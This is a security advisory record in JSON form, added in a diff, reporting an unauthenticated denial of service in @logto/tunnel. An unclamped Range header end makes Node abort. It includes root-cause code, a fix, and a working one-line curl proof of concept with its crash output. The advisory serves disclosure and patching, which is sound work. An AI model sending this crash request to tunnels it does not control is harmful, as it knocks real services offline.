@@ -1,0 +1,47 @@
+{
+  "global": null,
+  "id": "GHSA-cr4j-qhrf-249w",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 7.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-1284",
+      "CWE-617"
+    ],
+    "description": "## Summary\n\n`createStaticFileProxy`'s `readFile()` allocates a buffer sized from the **attacker-supplied**\n`Range` end without clamping it to the file size, then passes `buffer.length` to\n`fileHandle.read()`. Node's `fs.Read` binding asserts that the length argument is an\n`Int32`; a length above 2³¹−1 fails a native `CHECK`, which is **not catchable from\nJavaScript** - the process aborts with SIGABRT.\n\nOne unauthenticated GET against a 6-byte file kills the tunnel.\n\n## Affected version\n\n`@logto/tunnel` **0.3.11** (current npm `latest`). The same code is present in 0.3.8, i.e.\nthis is a sibling defect in the static-file handler that the CVE-2026-63188 fix rewrote -\n**not** a regression introduced by that fix.\n\n## Root cause\n\n`lib/commands/tunnel/utils.js:50-58`:\n\n```js\nconst readFile = async (requestPath, start, end) => {\n    const fileHandle = await fs.open(requestPath, 'r');\n    const { size } = await fileHandle.stat();\n    const readStart = start ?? 0;\n    const readEnd = end ?? Math.max(size - 1, 0);      // size is used ONLY when end is absent\n    const buffer = Buffer.alloc(readEnd - readStart + 1);\n    await fileHandle.read(buffer, 0, buffer.length, readStart);\n    ...\n```\n\n`end` arrives from `@logto/core-kit`'s `parseRange()`, which parses the header and returns\nthe number verbatim:\n\n```js\nexport const parseRange = (range) => {\n    const rangeMatch = /bytes=(\\d+)-(\\d+)?/.exec(range);\n    ...\n    const end = rangeMatch?.[2] === undefined ? undefined : Number.parseInt(rangeMatch[2], 10);\n    return { start, end, count };\n};\n```\n\nNothing compares `end` to `size`, and nothing returns 416 for an out-of-range end. With\n`end = 2147483648` the buffer is 2147483649 bytes, and `fileHandle.read()` hits\n`node_file.cc`'s `CHECK(args[3]->IsInt32())`.\n\n## Reachability\n\nAny network peer that can reach the tunnel's port - the same premise the parent advisory\nwas rated on. The configuration is the vendor's own documented example\n(`docs/customization/bring-your-ui/debug-and-test-your-custom-ui-locally.mdx`):\n\n```\nlogto-tunnel -p 9000 --experience-path /path/to/your/static/files --endpoint https://foobar.logto.app/\n```\n\n`commands/tunnel/index.ts` mounts `createStaticFileProxy(path)` whenever `--experience-path`\nis set. No flags beyond the documented ones, no credentials, no interaction.\n\n## Proof of concept (measured, 0.3.11, node v22.22.3)\n\n```\n$ logto-tunnel -p <port> --experience-path <lab>/static --endpoint https://foobar.logto.app/\n$ ls -l <lab>/static/a.txt        ->  6 bytes\n\n$ curl -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:<port>/a.txt\n200\n$ curl -o /dev/null -H 'Range: bytes=0-3' -w '%{http_code}\\n' http://127.0.0.1:<port>/a.txt\n206\n\n$ curl -H 'Range: bytes=0-2147483648' http://127.0.0.1:<port>/a.txt\n(no response, connection closed)\n$ echo $?   # of the tunnel process\n134                                   # 128 + 6 = SIGABRT\n```\n\nProcess output:\n\n```\n#  node[...]: void node::fs::Read(const v8::FunctionCallbackInfo<v8::Value>&) at ../src/node_file.cc:2535\n#  Assertion failed: args[3]->IsInt32()\n----- Native stack trace -----\n 1: node::Assert(node::AssertionInfo const&) [node]\n----- JavaScript stack trace -----\n 4: readFile (@logto/tunnel/lib/commands/tunnel/utils.js:56:22)\n```\n\n## Impact\n\nAvailability only, but total and trivially repeatable: a single request terminates the\ntunnel process. There is no `try/catch` that can save it - the abort happens in Node's C++\nlayer, below the handler's own `try` block. Under a supervisor that restarts the process, a\nrequest loop is a permanent outage.\n\nA secondary effect on the way to the abort: a smaller-but-still-large `Range` end (below\n`INT32_MAX`) makes the process zero-fill a buffer of that size, so an attacker can also\ndrive memory to near-OOM with one request per gigabyte.\n\n## Severity\n\n`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` = **7.5 (High)** by the formula; I rate the\npractical severity **Medium**, because the affected component is a developer-facing CLI\ntunnel rather than a production service, and there is no confidentiality or integrity\nimpact. The parent advisory for this same component was accepted at CVSS 4.0 8.7 on the\nsame reachability premise, so I am flagging the discrepancy rather than resolving it.\n\nCWE-1284 (improper validation of a quantity) → CWE-789 (memory allocation with excessive\nsize) → CWE-617 (reachable assertion) → CWE-400.\n\n## Suggested fix\n\nClamp in `readFile`, and answer 416 for an unsatisfiable range:\n\n```js\nconst readEnd = Math.min(end ?? size - 1, Math.max(size - 1, 0));\nif (readStart > readEnd) { throw new Error('Range not satisfiable.'); }\n```\n\n`getStaticFileErrorStatusCode` already maps `'Range not satisfiable.'` to 416, so the error\npath exists and only needs to be reached. Clamping in `parseRange` alone is not enough\nbecause it has no access to the file size.\n\n## Dedup\n\nParent advisory GHSA-rxjr-6c9q-h67x (CVE-2026-63188), *\"logto-tunnel serves files outside\n--experience-path via path traversal\"*, fixed in 0.3.9 by PR #9113 - a different defect\n(path confinement) in the same handler; the traversal check is unrelated to the range\narithmetic and is untouched by this report. Installing 0.3.8 shows the identical unclamped\n`readFile`, so this is neither a duplicate of nor a regression from that advisory. No other\nadvisory, issue or PR for `@logto/tunnel` mentions `Range`, buffer sizing, or a crash.\n\n## Honest limits\n\nMeasured on Linux with node v22.22.3. The exact threshold at which the abort occurs is\nNode's `Int32` assertion, so it is version-independent in practice, but the specific\n`node_file.cc` line number will differ across Node releases. I did not test Windows.\n\n\n---\n\n## Appendix - `EVIDENCE_logto_tunnel_range_abort_20260901.txt` (inlined; advisories accept no attachments)\n\n```text\n=== @logto/tunnel 0.3.11 (npm latest) - measured 2026-09-01, node v22.22.3, 127.0.0.1 only ===\n\nstart (verbatim from the vendor's documented example):\n  logto-tunnel -p <port> --experience-path <lab>/static --endpoint https://foobar.logto.app/\nserved file: <lab>/static/a.txt  = 6 bytes\n\nCONTROLS\n  GET /a.txt                       -> 200\n  GET /a.txt  Range: bytes=0-3     -> 206\n\nATTACK - one unauthenticated request\n  GET /a.txt  Range: bytes=0-2147483648   -> no response, connection closed\n  process exit status: 134 (128+6 = SIGABRT)\n\nprocess output:\n  #  node[...]: void node::fs::Read(const v8::FunctionCallbackInfo<v8::Value>&) at ../src/node_file.cc:2535\n  #  Assertion failed: args[3]->IsInt32()\n  ----- Native stack trace -----\n   1: node::Assert(node::AssertionInfo const&) [node]\n  ----- JavaScript stack trace -----\n   1: read (node:internal/fs/promises:697:13)\n   2: fsCall (node:internal/fs/promises:466:18)\n   3: read (node:internal/fs/promises:197:12)\n   4: readFile (@logto/tunnel/lib/commands/tunnel/utils.js:56:22)\n\nVERSION NOTE: the same unclamped readFile body is present in 0.3.8 (pre-CVE-2026-63188), so this is a sibling defect\n              in the handler that fix rewrote, NOT a regression the fix introduced.\n```\n",
+    "ghsa_id": "GHSA-cr4j-qhrf-249w",
+    "html_url": "https://github.com/logto-io/logto/security/advisories/GHSA-cr4j-qhrf-249w",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-cr4j-qhrf-249w"
+      }
+    ],
+    "published_at": "2026-11-09T07:02:05Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Unauthenticated one-request denial of service in `@logto/tunnel`: the `Range` end is never clamped to the file size, so `fileHandle.read()` gets a length above `INT32_MAX` and Node aborts",
+    "updated_at": "2026-11-09T07:02:05Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@logto/tunnel"
+        },
+        "patched_versions": "0.3.12",
+        "vulnerable_version_range": "<= 0.3.11"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "logto-io/logto"
+}
